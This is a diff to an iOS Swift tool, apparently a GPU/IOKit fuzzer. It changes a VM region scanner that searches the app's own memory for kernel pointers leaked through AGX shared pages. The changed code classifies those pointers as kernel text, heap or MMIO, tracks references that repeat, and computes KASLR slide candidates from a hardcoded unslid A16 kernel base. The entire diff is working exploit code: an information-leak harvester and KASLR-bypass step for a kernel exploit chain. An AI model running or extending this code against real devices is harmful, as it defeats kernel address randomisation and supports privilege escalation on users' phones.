@@ -1804,32 +1804,37 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
     }
 }
 
-// VM Region Scanner
-// Walks every readable mapped region in our own process via mach_vm_region.
-// The AGX IOKit user client maps ring buffers and feedback pages into user VA —
-// those shared pages contain kernel pointers that no GPU-side scan can reach.
-// Reports regions that contain kernel-range qwords (≥ 0xFFFFFE0000000000).
+// VM Region Scanner — classified pass
+// Walks every readable mapped region via vm_region_64.
+// Classifies each kernel-range pointer into:
+//   KTEXT  0xFFFFFE00_00000000 .. 0xFFFFFE01_00000000  — kernel __TEXT / __DATA (KASLR target)
+//   KHEAP  0xFFFFFE01_00000000 .. 0xFFFFFF00_00000000  — kalloc zones / kernel heap
+//   KMMIO  0xFFFFFF00_00000000 ..                      — IOKit MMIO / physical aperture
+// Reports stable repeated values (same ptr at 3+ offsets = object ref) and
+// attempts KASLR slide estimate if any KTEXT pointers are found.
 func runVMRegionScan(log: FuzzLog, completion: @escaping () -> Void) {
     DispatchQueue.global(qos: .userInitiated).async {
         func step(_ s: String) { log.append(s) }
 
-        // Initialise AGX so its shared memory regions are mapped into our process
         guard let device = MTLCreateSystemDefaultDevice() else {
             step("device nil"); completion(); return
         }
         _ = device.makeCommandQueue()
-        step("AGX init — walking VM regions for kernel ptrs")
+        step("AGX init — classified VM region scan")
 
         var addr: vm_address_t = 0
         var totalRegions = 0
         var hotRegions   = 0
-        var kernelPtrs   = 0
+        var cKTEXT = 0, cKHEAP = 0, cKMMIO = 0
 
-        while totalRegions < 1500 && kernelPtrs < 150 {
+        // Track KTEXT candidates for KASLR
+        var ktextSamples: [(region: UInt, offset: Int, val: UInt64)] = []
+        // Track value frequency for stable-ref detection
+        var valueCounts: [UInt64: Int] = [:]
+
+        while totalRegions < 2000 {
             var size:    vm_size_t = 0
             var info     = vm_region_extended_info_compat_t()
-            // flavor=13 (VM_REGION_EXTENDED_INFO), count=12 (struct size/4) — hardcoded
-            // to avoid Apple's "unavailable: structure not supported" macro restrictions
             var count    = mach_msg_type_number_t(12)
             var objName: mach_port_t = 0
 
@@ -1841,40 +1846,90 @@ func runVMRegionScan(log: FuzzLog, completion: @escaping () -> Void) {
             guard kr == KERN_SUCCESS else { break }
             totalRegions += 1
 
-            let readable  = (info.protection & VM_PROT_READ) != 0
-            // share_mode: SM_SHARED=2, SM_TRUESHARED=4, SM_PRIVATE=3
-            let isShared  = info.share_mode != 3
-            // user_tag 12 = VM_MEMORY_IOKIT — AGX ring buffers land here
-            let tag       = info.user_tag
+            let readable = (info.protection & VM_PROT_READ) != 0
+            let isShared = info.share_mode != 3
+            let tag      = info.user_tag
 
-            // Scan readable regions between 64 B and 32 MB
             if readable && size >= 64 && size <= 32 * 1024 * 1024 {
                 let raw = UnsafeRawPointer(bitPattern: UInt(addr))!
                     .assumingMemoryBound(to: UInt8.self)
-                var regionHits = 0
+
+                var rKTEXT = 0, rKHEAP = 0, rKMMIO = 0
+                var headerLogged = false
+                var logged = 0
 
                 for qw in 0..<(Int(size) / 8) {
                     var val: UInt64 = 0
                     for b in 0..<8 { val |= UInt64(raw[qw*8 + b]) << (b*8) }
                     guard val >= 0xFFFFFE0000000000 && val != 0xFFFFFFFFFFFFFFFF else { continue }
 
-                    if regionHits == 0 {
+                    // Classify
+                    let cat: String
+                    if val < 0xFFFFFE0100000000 {
+                        cat = "KTEXT"; rKTEXT += 1; cKTEXT += 1
+                        if ktextSamples.count < 30 {
+                            ktextSamples.append((region: UInt(addr), offset: qw*8, val: val))
+                        }
+                    } else if val < 0xFFFFFF0000000000 {
+                        cat = "KHEAP"; rKHEAP += 1; cKHEAP += 1
+                    } else {
+                        cat = "KMMIO"; rKMMIO += 1; cKMMIO += 1
+                    }
+                    valueCounts[val, default: 0] += 1
+
+                    if !headerLogged {
                         hotRegions += 1
                         let sh = isShared ? " SHARED" : ""
-                        step("  [REGION 0x\(String(addr, radix:16)) sz=0x\(String(size, radix:16)) tag=\(tag)\(sh)]")
+                        step("  [REGION 0x\(String(addr,radix:16)) sz=0x\(String(size,radix:16)) tag=\(tag)\(sh)]")
+                        headerLogged = true
                     }
-                    step("    +0x\(String(qw*8, radix:16)) = 0x\(String(val, radix:16)) *** KPTR")
-                    regionHits += 1
-                    kernelPtrs += 1
-                    if regionHits >= 8 { step("    ..."); break }
-                    if kernelPtrs >= 150 { break }
+
+                    // Always log KTEXT; log KHEAP/KMMIO up to 20 per region
+                    if cat == "KTEXT" || logged < 20 {
+                        step("    +0x\(String(qw*8,radix:16)) = 0x\(String(val,radix:16)) [\(cat)]")
+                        logged += 1
+                    }
+                }
+
+                if headerLogged {
+                    step("    ^ KTEXT=\(rKTEXT) KHEAP=\(rKHEAP) KMMIO=\(rKMMIO)")
                 }
             }
 
             addr += size
         }
 
-        step("walked \(totalRegions) regions | \(hotRegions) hot | \(kernelPtrs) kernel ptrs")
+        // Global summary
+        step("walked \(totalRegions) regions | \(hotRegions) hot")
+        step("KTEXT=\(cKTEXT) | KHEAP=\(cKHEAP) | KMMIO=\(cKMMIO) | total=\(cKTEXT+cKHEAP+cKMMIO)")
+
+        // Stable repeated refs (3+ occurrences = same kernel object referenced multiple times)
+        let repeats = valueCounts.filter { $0.value >= 3 }.sorted { $0.value > $1.value }
+        if !repeats.isEmpty {
+            step("STABLE REFS (ptr seen ≥3×):")
+            for (val, cnt) in repeats.prefix(8) {
+                let cat = val < 0xFFFFFE0100000000 ? "KTEXT" : (val < 0xFFFFFF0000000000 ? "KHEAP" : "KMMIO")
+                step("  0x\(String(val,radix:16)) × \(cnt) [\(cat)]")
+            }
+        }
+
+        // KASLR attempt — unslid kernel base on A16 iOS = 0xFFFFFE0007004000
+        if !ktextSamples.isEmpty {
+            step("KASLR CANDIDATES (\(ktextSamples.count) KTEXT ptrs found):")
+            let unslid: UInt64 = 0xFFFFFE0007004000
+            for s in ktextSamples.prefix(10) {
+                let slide = s.val &- unslid
+                step("  0x\(String(s.val,radix:16)) @ +0x\(String(s.offset,radix:16)) → slide~0x\(String(slide,radix:16))")
+            }
+        } else {
+            step("NO KTEXT ptrs found — all leaks are KHEAP/KMMIO")
+            step("  KMMIO ptrs are IOKit/physical-aperture refs — need offline kernelcache anchor")
+            step("  Most stable KMMIO ref:")
+            if let top = repeats.first {
+                step("  → 0x\(String(top.key,radix:16)) × \(top.value) (extract this for offline analysis)")
+            }
+        }
+
         step("── VM Region Scan complete ─────────────────")
         completion()
     }
